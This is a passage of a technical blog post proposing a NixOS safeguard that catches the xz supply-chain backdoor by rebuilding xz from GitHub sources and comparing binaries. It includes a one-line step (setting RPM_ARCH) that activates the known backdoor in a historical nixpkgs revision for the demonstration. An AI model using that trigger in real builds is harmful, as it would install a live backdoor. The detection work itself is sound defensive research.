<div role="alert">
  <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 20">
    <path d="M10 .5a9.5 9.5 0 1 0 9.5 9.5A9.51 9.51 0 0 0 10 .5ZM9.5 4a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3ZM12 15H8a1 1 0 0 1 0-2h1v-3H8a1 1 0 0 1 0-2h2a1 1 0 0 1 1 1v4h1a1 1 0 0 1 0 2Z"></path>
  </svg>
  <p><span>Info</span></p><p>
  This part is about how I think NixOS could have detected the xz attack even though xz is built as part of the NixOS bootstrap phase.

  </p>
</div>


<p>Assuming <code>xz</code> is bitwise reproducible (and that is indeed the case), and that the maintainer provided tarball doesn’t contain any modification that impacts the build process, building it from the GitHub tarball or from the maintainer provided tarball <em>should</em> produce the same artifacts, right? Based on this idea, my proposal is to build <code>xz</code> a second time <em>after</em> the bootstrap, this time using the GitHub tarball (which is only possible after the bootstrap). If both builds differ we can suspect that there a suspicion of a supply chain compromise.</p>
<figure id="fig:SED-HR4049">
<img src="https://luj.fr/assets/sumary-method.png"/>
<figcaption>Summary of the method I propose to detect vulnerable <code>xz</code> source tarballs</figcaption>
</figure>
<p>Let’s see how this could be implemented:</p>
<p>First, we rewrite the <code>xz</code> package, this time using the <code>fetchFromGitHub</code> function. I create a <code>after-boostrap.nix</code> file alongside the original <code>xz</code> expression in the <code>pkgs/tools/compression/xz</code> directory of <code>nixpkgs</code>:</p>
<pre tabindex="0"><code><span><span>  {</span></span>
<span><span>  lib</span><span>,</span></span>
<span><span>  stdenv</span><span>,</span></span>
<span><span>  fetchurl</span><span>,</span></span>
<span><span>  enableStatic</span><span> ?</span><span> false</span><span>,</span></span>
<span><span>  writeScript</span><span>,</span></span>
<span><span>  fetchFromGitHub</span><span>,</span></span>
<span><span>  testers</span><span>,</span></span>
<span><span>  gettext</span><span>,</span></span>
<span><span>  autoconf</span><span>,</span></span>
<span><span>  libtool</span><span>,</span></span>
<span><span>  automake</span><span>,</span></span>
<span><span>  perl538Packages</span><span>,</span></span>
<span><span>  doxygen</span><span>,</span></span>
<span><span>  xz</span><span>,</span></span>
<span><span>}:</span></span>
<span></span>
<span><span>stdenv</span><span>.</span><span>mkDerivation </span><span>(</span><span>finalAttrs</span><span>:</span><span> {</span></span>
<span><span>  pname</span><span> =</span><span> &#34;xz&#34;</span><span>;</span></span>
<span><span>  version</span><span> =</span><span> &#34;5.6.1&#34;</span><span>;</span></span>
<span></span>
<span><span>  src</span><span> =</span><span> fetchFromGitHub </span><span>{</span></span>
<span><span>    owner</span><span> =</span><span> &#34;tukaani-project&#34;</span><span>;</span></span>
<span><span>    repo</span><span> =</span><span> &#34;xz&#34;</span><span>;</span></span>
<span><span>    rev</span><span> =</span><span> &#34;v</span><span>${</span><span>finalAttrs</span><span>.</span><span>version</span><span>}</span><span>&#34;</span><span>;</span></span>
<span><span>    hash</span><span> =</span><span> &#34;sha256-alrSXZ0KWVlti6crmdxf/qMdrvZsY5yigcV9j6GIZ6c=&#34;</span><span>;</span></span>
<span><span>  };</span></span>
<span></span>
<span><span>  strictDeps</span><span> =</span><span> true</span><span>;</span></span>
<span><span>  configureFlags</span><span> =</span><span> lib</span><span>.</span><span>optional enableStatic </span><span>&#34;--disable-shared&#34;</span><span>;</span></span>
<span><span>  enableParallelBuilding</span><span> =</span><span> true</span><span>;</span></span>
<span><span>  doCheck</span><span> =</span><span> true</span><span>;</span></span>
<span></span>
<span><span>  nativeBuildInputs</span><span> =</span><span> [</span></span>
<span><span>    gettext</span></span>
<span><span>    autoconf</span></span>
<span><span>    libtool</span></span>
<span><span>    automake</span></span>
<span><span>    perl538Packages</span><span>.</span><span>Po4a</span></span>
<span><span>    doxygen</span></span>
<span><span>    perl</span></span>
<span><span>  ];</span></span>
<span></span>
<span><span>  preConfigure</span><span> =</span><span> &#39;&#39;</span></span>
<span><span>    ./autogen.sh</span></span>
<span><span>  &#39;&#39;</span><span>;</span></span>
<span></span>
<span><span>})</span></span>
<span></span></code></pre>

<p>I removed details here to focus on the most important: the Nix expression is very similar to the actual derivation for <code>xz</code>, the only difference (apart from the method to fetch the source) is that we need to use <code>autoconf</code> to generate configure scripts. When using the maintainer provided tarball these are already pre-generated for us (as Daniel Stenberg was explaining in the toot above) – which is very handy particularly when you are building <code>xz</code> in the bootstrap phase of a distribution and you don’t want a dependency on <code>autoconf</code> / <code>automake</code> – but in this instance we have to do it ourselves.</p>
<p>Now that we can build <code>xz</code> from the code archive provided by GitHub, we have to write Nix code to compare both outputs. For that purpose, we register a new phase called <code>compareArtifacts</code>, that runs at the very end of the build process. To make my point, I’ll first only compare the <code>liblzma.so</code> file (the one that was modified by the backdoor), but we could easily generalize this phase to all binaries and libraries outputs:</p>
<pre tabindex="0"><code><span><span>postPhases = </span><span>[</span><span> &#34;compareArtifacts&#34;</span><span> ]</span><span>;</span></span>
<span></span>
<span><span>compareArtifacts = </span><span>&#39;&#39;</span></span>
<span><span>  diff $out/lib/liblzma.so </span><span>${</span><span>xz</span><span>.</span><span>out</span><span>}</span><span>/lib/liblzma.so</span></span>
<span><span>&#39;&#39;</span><span>;</span></span>
<span></span></code></pre>

<p>After this change, building <code>xz-after-bootstrap</code> on master<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> still works, showing that in a normal setting, both artifacts are indeed identical.</p>
<pre tabindex="0"><code><span><span>$</span><span> nix-build -A xz-after-bootstrap</span></span>
<span><span>/nix/store/h23rfcjxbp1vqmmbvxkv0f69r579kfc1-xz-5.6.1</span></span>
<span></span></code></pre>

<p>Let’s now try our detection method on the backdoored <code>xz</code> and see what happens! We checkout revision <code>c53bbe3</code> that contains the said version<a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a>, and build <code>xz-after-bootstrap</code>.</p>
<pre tabindex="0"><code><span><span>$</span><span> git checkout c53bbe3</span></span>
<span><span>$</span><span> nix-build -A xz-after-boostrap</span></span>
<span><span>/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1</span></span>
<span></span></code></pre>

<p>Again, identical artifacts? Remember that the backdoor was not active in NixOS, partly because there is a check that the <code>RPM_ARCH</code> variable is set in the script that installs the backdoor. So let’s set it in <code>pkgs/tools/compression/xz/default.nix</code> to activate the backdoor<a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a>.</p>
<pre tabindex="0"><code><span><span>env</span><span>.</span><span>RPM_ARCH = </span><span>true</span><span>;</span></span>
<span></span></code></pre>

<pre tabindex="0"><code><span><span>$</span><span> nix-build -A xz-after-boostrap</span></span>
<span><span>/nix/store/57p62d3m98s2bgma5hcz12b4vv6nhijn-xz-5.6.1</span></span>
<span><span>...</span></span>
<span><span>...</span></span>
<span><span>Running phase: compareBins</span></span>
<span><span>Binary files /nix/store/cxz8iq3hx65krsyraill6figp03dk54n-xz-5.6.1/lib/liblzma.so and /nix/store/4qp2khyb22hg6a3jiy4hqmasjinfkp2g-xz-5.6.1/lib/liblzma.so differ</span></span>
<span></span></code></pre>

<p>That’s it, binary artifacts are different now! Let’s try to understand a bit more what makes them different by keeping them as part of the output. For that, we modify the <code>compareArtifacts</code> phase:</p>
<pre tabindex="0"><code><span><span>compareArtifacts = </span><span>&#39;&#39;</span></span>
<span><span>  cp </span><span>${</span><span>xz</span><span>.</span><span>out</span><span>}</span><span>/lib/liblzma.so $out/xzBootstrap</span></span>
<span><span>  cp $out/lib/liblzma.so $out/xzAfterBootstrap</span></span>
<span><span>  diff $out/lib/liblzma.so </span><span>${</span><span>xz</span><span>.</span><span>out</span><span>}</span><span>/lib/liblzma.so || true</span></span>
<span><span>&#39;&#39;</span><span>;</span></span>
<span></span></code></pre>

<p>This time the diff doesn’t make the build fail and we store both versions of the <code>liblzma.so</code> to be able to compare them afterwards.</p>
<pre tabindex="0"><code><span><span>$</span><span> ls -lah result</span></span>
<span><span>total 69M</span></span>
<span><span>dr-xr-xr-x      6 root root     99 Jan  1  1970 .</span></span>
<span><span>drwxrwxr-t 365666 root nixbld  85M Dec 10 14:27 ..</span></span>
<span><span>dr-xr-xr-x      2 root root   4.0K Jan  1  1970 bin</span></span>
<span><span>dr-xr-xr-x      3 root root     32 Jan  1  1970 include</span></span>
<span><span>dr-xr-xr-x      3 root root    103 Jan  1  1970 lib</span></span>
<span><span>dr-xr-xr-x      4 root root     31 Jan  1  1970 share</span></span>
<span><span>-r-xr-xr-x      1 root root   210K Jan  1  1970 xzAfterBootstrap</span></span>
<span><span>-r-xr-xr-x      1 root root   258K Jan  1  1970 xzBootstrap</span></span>
<span></span></code></pre>

<p>We can notice that there is even a significant size difference between the two artifacts with an increase of 48Kb for the backdoored one. Let’s try to understand where this difference comes from. We can use the <code>nm</code> command from <code>binutils</code> to list the symbols in an artifact:</p>
<pre tabindex="0"><code><span><span>$</span><span> nm result/xzAfterBootstrap</span></span>
<span><span>000000000000d3b0 t alone_decode</span></span>
<span><span>000000000000d380 t alone_decoder_end</span></span>
<span><span>000000000000d240 t alone_decoder_memconfig</span></span>
<span><span>0000000000008cc0 t alone_encode</span></span>
<span><span>0000000000008c90 t alone_encoder_end</span></span>
<span><span>0000000000008db0 t alone_encoder_init</span></span>
<span><span>0000000000020a80 t arm64_code</span></span>
<span><span>0000000000020810 t arm_code</span></span>
<span><span>0000000000020910 t armthumb_code</span></span>
<span><span>000000000000d8d0 t auto_decode</span></span>
<span><span>000000000000d8a0 t auto_decoder_end</span></span>
<span><span>000000000000d730 t auto_decoder_get_check</span></span>
<span><span>000000000000d7a0 t auto_decoder_init</span></span>
<span><span>000000000000d750 t auto_decoder_memconfig</span></span>
<span><span>0000000000022850 r available_checks.1</span></span>
<span><span>00000000000225f0 r bcj_optmap</span></span>
<span><span>0000000000008fb0 t block_buffer_encode</span></span>
<span><span>...</span></span>
<span></span></code></pre>

<p>Now we can diff the symbols between the two artifacts:</p>
<pre tabindex="0"><code><span><span>$ diff -u0 &lt;(nm --format=just-symbols xzAfterBootstrap) &lt;(nm --format=just-symbols xzBootstrap)</span></span>
<span><span>--- /dev/fd/63	2024-12-10 15:27:11.477332683 +0000</span></span>
<span><span>+++ /dev/fd/62	2024-12-10 15:27:11.478332717 +0000</span></span>
<span><span>@@</span><span> -31,0 +32 </span><span>@@</span></span>
<span><span>+</span><span>_cpuid</span></span>
<span><span>@@</span><span> -65,0 +67 </span><span>@@</span></span>
<span><span>+</span><span>_get_cpuid</span></span>
<span><span>@@</span><span> -448,0 +451 </span><span>@@</span></span>
<span><span>+</span><span>__tls_get_addr@GLIBC_2.3</span></span>
<span></span></code></pre>

<p>TADA! We see the added <code>_get_cpuid</code> symbol, documented in numerous technical report about the <code>xz</code> backdoor, confirming our method works!</p>
<p><strong>Addendum 1: How to implement this safeguard in <code>nixpkgs</code>?</strong></p>
<p>I think <code>nixpkgs</code> should implement this kind of safeguard for every package built as part of the bootstrap phase that is not using a trusted source archive. The <code>*-after-bootstrap</code> packages could then be added to the channel blockers to ensure that there is big red alarm that requires intervention from the maintainers if ever one of those would not build.</p>
<p>As a proof of concept, and to gather the feedback of the community I opened <a href="https://github.com/NixOS/nixpkgs/pull/391569">a pull request</a> in the <code>nixpkgs</code> repository for the <code>xz</code> case, but if the method is adopted we should then implement it for the other candidate packages in <code>nixpkgs</code>’s bootstrap.</p>
<p><strong>Addendum 2: Evaluation: reproducibility of <code>stdenv</code> over time</strong></p>
<p>As discussed above, the method I propose assumes the packages we want to build trust in are <em>bitwise reproducible</em>. In order to help validate the approach, let’s verify that the packages belonging to the <code>stdenv</code> runtime are indeed reproducible.
To do that, I have (as part of a bigger research project whose findings are summarized in <a href="https://luj.fr/blog/is-nixos-truly-reproducible.html">another blog post</a>) sampled 17 <code>nixpkgs-unstable</code> revisions from 2017 to 2023 and rebuilt every <em>non-fixed-output-derivation</em> (FOD) composing <code>stdenv</code> from these revisions using the <code>nix-build --check</code> command to check for bitwise reproducibility.
Here are my findings:</p>
<ul>
<li>In every revision <code>xz</code> was bitwise reproducible ;</li>
<li>In 12 of the 17 revisions there was either one or two packages that were buildable but not reproducible, but those packages are consistent over time: for example <code>gcc</code> has consistently been non reproducible from 2017 to 2021 and <code>bash</code> until 2019.</li>
</ul>
<p>These findings, while showing that this method cannot be applied to <em>every</em> package in <code>stdenv</code>, are encouraging: even if some packages are not bitwise reproducible, they are consistently so, which means that it should be possible to selectively activate it on packages that exhibit good reproducibility in the long term.</p>
<p><strong>Addendum 3: Limitations: the trusting trust issue</strong></p>
<p>The trusting trust issue is a famous <a href="https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf">thought experiment initiated by Ken Thomson</a> during his Turing award acceptance lecture. The idea is the following: assume there is a backdoor in compilers we use to build our software such that the compiler propagates the backdoor to all new version of itself that it builds, but behaves normally for any other build until some point in time where it backdoors all executables it produces. Moderns compilers often need a previous version of themselves to be compiled so there must be an initial executable that we have to trust to build our software, making this kind of sophisticated attack <em>theoretically</em> possible and completely undetectable.
Similarly, the method I am proposing here requires to make the assumption that the untrusted <code>xz</code> (the one built during the bootstrap phase) can’t indirectly corrupt the build of <code>xz-after-bootstrap</code> to make it look like the produced artifacts are identical. Again, such an attack would probably be extremely complex to craft so the assumption here seems sane.</p></li>
</ol>
<h3 id="thanks">Thanks</h3>
<p>I would like to thank <a href="https://www.theozimmermann.net/">Théo Zimmermann</a>, <a href="https://orcid.org/0009-0008-7972-7160">Pol Dellaiera</a>, <a href="https://groundry.org/">Martin Schwaighofer</a>, and <a href="https://upsilon.cc/~zack/">Stefano Zacchiroli</a> for their valuable feedback and insightful discussions during the writing of this blog post. Their contributions significantly helped me organize and refine my ideas on this topic.</p>

        </div></div>
  </body>
</html>
